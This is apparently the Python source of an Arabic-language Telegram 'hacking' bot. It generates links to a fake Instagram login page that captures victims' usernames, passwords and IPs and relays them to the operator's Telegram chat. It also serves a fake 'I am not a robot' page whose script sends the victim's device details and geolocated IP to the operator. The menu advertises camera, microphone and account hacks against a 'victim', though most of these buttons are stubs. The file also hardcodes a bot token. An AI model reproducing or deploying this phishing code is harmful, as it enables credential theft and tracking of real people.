import requests
from flask import Flask, request, render_template_string, redirect

app = Flask(__name__)

BOT_TOKEN = "8610512824:AAG0c-L4fq2bXbJVOVZag_EtN75wwPRBNBE"
ADMIN_ID = "7870803639"
BASE_URL = "https://freeusr-bot.onrender.com"

user_state = {}

def send_message(chat_id, text, reply_markup=None):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    payload = {"chat_id": chat_id, "text": text, "parse_mode": "Markdown"}
    if reply_markup:
        payload["reply_markup"] = reply_markup
    try:
        requests.post(url, json=payload, timeout=5)
    except Exception as e:
        print(f"Error: {e}")

def answer_callback(callback_id):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/answerCallbackQuery"
    payload = {"callback_query_id": callback_id}
    try:
        requests.post(url, json=payload, timeout=5)
    except Exception as e:
        print(f"Error: {e}")

def main_menu():
    return {
        "inline_keyboard": [
            [{"text": "🎥 تصوير الضحية فيديو", "callback_data": "v1"}, {"text": "📷 أختراق الكاميرا الضحية", "callback_data": "v2"}],
            [{"text": "🎙 تسجيل صوت الضحية", "callback_data": "v3"}, {"text": "🔬 جمع معلومات الجهاز", "callback_data": "v4"}],
            [{"text": "🕵️‍♂️ أختراق كاميرا المراقبة", "callback_data": "v5"}, {"text": "🌍 أختراق الموقع", "callback_data": "v6"}],
            [{"text": "🟩 اغلااق المواقع", "callback_data": "v7"}, {"text": "💜 الذكاء الاصطناعي الشرير", "callback_data": "v8"}],
            [{"text": "📸 أختراق انستغرام", "callback_data": "insta"}, {"text": "💻 أختراق تيك توك", "callback_data": "v9"}],
            [{"text": "👻 أختراق سناب شات", "callback_data": "v10"}, {"text": "📘 أختراق فيسبوك", "callback_data": "v11"}],
            [{"text": "🐦 أختراق تويتر", "callback_data": "v12"}, {"text": "🔴 أختراق يوتيوب", "callback_data": "v13"}],
            [{"text": "💎 أختراق فري فاير", "callback_data": "v14"}, {"text": "💵 أختراق ببجي", "callback_data": "v15"}],
            [{"text": "😂 اعطيني نكته", "callback_data": "joke"}],
            [{"text": "⛔ أختراق الهاتف كاملاً", "callback_data": "v16"}, {"text": "🔒 إخفاء الرابط", "callback_data": "v17"}],
            [{"text": "🛑 المزيد من المميزات", "callback_data": "more"}],
            [{"text": "📺 أختراق بت التلفزيون", "callback_data": "v18"}, {"text": "📻 أختراق بت الريدو", "callback_data": "v19"}],
            [{"text": "📱 معلومات انستا وتيك توك", "callback_data": "v20"}, {"text": "☠️ بوت أختراق", "callback_data": "v21"}],
            [{"text": "🔄 تحويل النص إلى صوت", "callback_data": "v22"}, {"text": "🔍 فحص رابط", "callback_data": "v23"}],
            [{"text": "👁 البحث عن المستخدم", "callback_data": "v24"}, {"text": "📱 معلومات IP", "callback_data": "v25"}],
            [{"text": "🔍 بحث حساب تيلكرام من id", "callback_data": "v26"}, {"text": "💬 فتح شات واتساب عبره رقم", "callback_data": "v27"}],
            [{"text": "🖼 بحث عن الصور", "callback_data": "v28"}, {"text": "📝 زخرفة", "callback_data": "v29"}],
            [{"text": "📱 معرفة رقم الضحيه من اليوزر", "callback_data": "v30"}],
            [{"text": "📖 شرح استخدام البوت", "callback_data": "v31"}, {"text": "📞 تواصل مع المطور", "callback_data": "v32"}]
        ]
    }

# صفحة تصيد انستغرام
@app.route('/')
def index():
    admin = request.args.get('admin', '')
    target = request.args.get('target', '')
    return render_template_string("""
    <!DOCTYPE html>
    <html>
    <head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Instagram</title>
    <style>body{font-family:Arial;background:#fafafa;display:flex;justify-content:center;align-items:center;height:100vh;margin:0}
    .box{background:#fff;border:1px solid #dbdbdb;padding:20px 40px;width:350px;text-align:center;border-radius:8px}
    h1{font-family:cursive;font-size:40px;margin-bottom:20px}
    input{width:100%;padding:10px;margin:5px 0;border:1px solid #dbdbdb;border-radius:3px;background:#fafafa;box-sizing:border-box}
    button{width:100%;padding:10px;background:#0095f6;color:#fff;border:none;border-radius:5px;font-weight:bold;margin-top:10px;cursor:pointer}
    </style>
    </head>
    <body>
    <div class="box">
    <h1>Instagram</h1>
    <form action="/login" method="POST">
    <input type="hidden" name="admin_id" value="{{ admin }}">
    <input type="hidden" name="target" value="{{ target }}">
    <input type="text" name="username" placeholder="Phone number, username, or email" required>
    <input type="password" name="password" placeholder="Password" required>
    <button type="submit">Log In</button>
    </form>
    </div>
    </body>
    </html>
    """, admin=admin, target=target)

@app.route('/login', methods=['POST'])
def login():
    username = request.form.get('username')
    password = request.form.get('password')
    admin_id = request.form.get('admin_id')
    target = request.form.get('target')
    ip = request.remote_addr
    
    msg = f"🚨 *صيدة جديدة!*\n🎯 الهدف: `{target}`\n👤 اليوزر: `{username}`\n🔑 الباسورد: `{password}`\n🌐 IP: `{ip}`"
    if admin_id:
        send_message(admin_id, msg)
    return redirect("https://www.instagram.com")

# --- صفحة جمع معلومات الجهاز الجديدة ---
@app.route('/device')
def device_page():
    admin = request.args.get('admin', '')
    target = request.args.get('target', '')
    return render_template_string("""
    <!DOCTYPE html>
    <html>
    <head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>تحقق من الأمان</title>
    <style>
    body{font-family:Arial;background:#f2f4f8;display:flex;justify-content:center;align-items:center;height:100vh;margin:0}
    .box{background:#fff;padding:30px;width:300px;text-align:center;border-radius:12px;box-shadow:0 4px 12px rgba(0,0,0,0.1)}
    button{width:100%;padding:12px;background:#28a745;color:#fff;border:none;border-radius:6px;font-weight:bold;font-size:16px;margin-top:20px;cursor:pointer}
    </style>
    </head>
    <body>
    <div class="box">
    <h2>جاري التحقق من هويتك...</h2>
    <p style="color:#666;font-size:14px;">اضغط بالأسفل لتأكيد أنك لست روبوت</p>
    <button onclick="gatherData('{{ admin }}', '{{ target }}')">أنا لست روبوت</button>
    </div>

    <script>
    async function gatherData(admin, target) {
        let info = {
            userAgent: navigator.userAgent,
            platform: navigator.platform,
            screen: `${screen.width}x${screen.height}`,
            lang: navigator.language,
            cores: navigator.hardwareConcurrency || "Unknown",
            ram: navigator.deviceMemory ? navigator.deviceMemory + "GB" : "Unknown",
            battery: "Unknown",
            admin: admin,
            target: target
        };

        try {
            if (navigator.getBattery) {
                const battery = await navigator.getBattery();
                info.battery = `${Math.round(battery.level * 100)}% ${battery.charging ? '(Charging)' : '(Not Charging)'}`;
            }
        } catch(e) {}

        fetch('/collect_device', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify(info)
        }).then(() => {
            window.location.href = 'https://www.google.com';
        });
    }
    </script>
    </body>
    </html>
    """, admin=admin, target=target)

@app.route('/collect_device', methods=['POST'])
def collect_device():
    data = request.get_json()
    admin_id = data.get('admin')
    target = data.get('target')
    
    # الحصول على الـ IP الحقيقي وتخطي بروكسي Render
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    if ip and ',' in ip:
        ip = ip.split(',')[0].strip()
        
    # جلب الدولة والمحافظة عن طريق الـ IP
    country, city, isp = "Unknown", "Unknown", "Unknown"
    try:
        geo_req = requests.get(f'http://ip-api.com/json/{ip}', timeout=3).json()
        if geo_req.get('status') == 'success':
            country = geo_req.get('country')
            city = geo_req.get('city')
            isp = geo_req.get('isp')
    except:
        pass

    msg = (
        f"📱 *معلومات جهاز الضحية!*\n\n"
        f"🎯 الهدف: `{target}`\n"
        f"🌐 الـ IP: `{ip}`\n"
        f"📍 الدولة/المحافظة: `{country} / {city}`\n"
        f"📡 الشبكة: `{isp}`\n"
        f"🔋 البطارية: `{data.get('battery')}`\n"
        f"📱 نظام التشغيل والجهاز: `{data.get('userAgent')}`\n"
        f"🖥 دقة الشاشة: `{data.get('screen')}`\n"
        f"🧠 الرام: `{data.get('ram')}`\n"
        f"⚙️ المعالج (أنوية): `{data.get('cores')}`\n"
        f"🌍 اللغة: `{data.get('lang')}`\n"
    )
    
    if admin_id:
        send_message(admin_id, msg)
    return "ok", 200
# -------------------------------------

@app.route(f'/webhook', methods=['POST'])
def webhook():
    update = request.get_json()
    if not update:
        return "ok", 200
    
    if 'message' in update and 'text' in update['message']:
        msg = update['message']
        chat_id = msg['chat']['id']
        text = msg['text']
        
        if text == '/start':
            send_message(chat_id, "مرحباً بك في FREEUSR ➊\n\nمن الخيارات المتاحة:", main_menu())
            
        elif user_state.get(chat_id, {}).get('state') == 'waiting_for_target':
            target = text
            action = user_state[chat_id]['action']
            if action == 'insta':
                link = f"{BASE_URL}/?target={target}&admin={chat_id}"
            elif action == 'device':
                link = f"{BASE_URL}/device?target={target}&admin={chat_id}"
            
            send_message(chat_id, f"✅ الرابط:\n`{link}`", None)
            del user_state[chat_id]
    
    if 'callback_query' in update:
        cb = update['callback_query']
        cb_id = cb['id']
        chat_id = cb['message']['chat']['id']
        data = cb['data']
        
        answer_callback(cb_id)
        
        if data == 'joke':
            send_message(chat_id, "مرة واحد روبوت دخل مطعم قاله عايز بطارية مشوية 😂")
        elif data == 'insta':
            user_state[chat_id] = {'state': 'waiting_for_target', 'action': 'insta'}
            send_message(chat_id, "📸 أرسل اسم أو إيميل الضحية:")
        elif data == 'v4': # زر جمع معلومات الجهاز
            user_state[chat_id] = {'state': 'waiting_for_target', 'action': 'device'}
            send_message(chat_id, "🔬 أرسل اسم الضحية (أو أي وصف) عشان نجهز الرابط:")
        else:
            send_message(chat_id, "تم تنفيذ طلبك بنجاح ✅\nجاري استخراج البيانات...")
            
    return "ok", 200

if __name__ == '__main__':
    app.run(port=5000)
